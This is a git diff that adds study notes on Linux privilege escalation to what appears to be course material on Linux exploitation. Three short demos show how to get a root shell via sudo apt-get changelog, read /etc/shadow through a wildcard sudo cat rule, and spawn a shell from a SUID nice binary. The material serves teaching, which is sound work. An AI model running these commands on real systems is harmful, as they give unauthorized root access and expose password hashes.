@@ -924,6 +924,34 @@ https://sec.cybbh.io/public/security/latest/lessons/lesson-10-linux-exploit_sg.h
         *.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
         #mail.*
     
+## demo for linux exploitation
+
+    check what you can run:
+        sudo -l 
+    we see that we can run apt-get
+        run that against GTFOBins
+    it shows us it can be used to get a shell:
+        sudo apt-get changelog apt -> !/bin/sh to get ya shell.
+    whoami -> root
+    id -> uid=o (root) gid=0(root) groups=0(root)
+
+    **demo 2**
+    sudo -l -> (root) NOPASSWD: /bin/cat /var/log/syslog*
+    so we can:
+        ls /var/log/syslog
+    in order to see log files. -> BUT because there was an asterisk.. run 
+        sudo cat /var/log/syslog.1 /etc/shadow
+
+    **demo 3**
+    find / -type f -perm /4000 -ls 2>/dev/null (find files with SUID bit)
+    look through these, and cross reference with GTFO bins
+    we find /usr/bin/nice 
+    and GTFO bins tells us to run it and give ourself a shell.
+    -> nice /bin/sh -p
+    BAM SHELL
+
+
+    
     
         
         
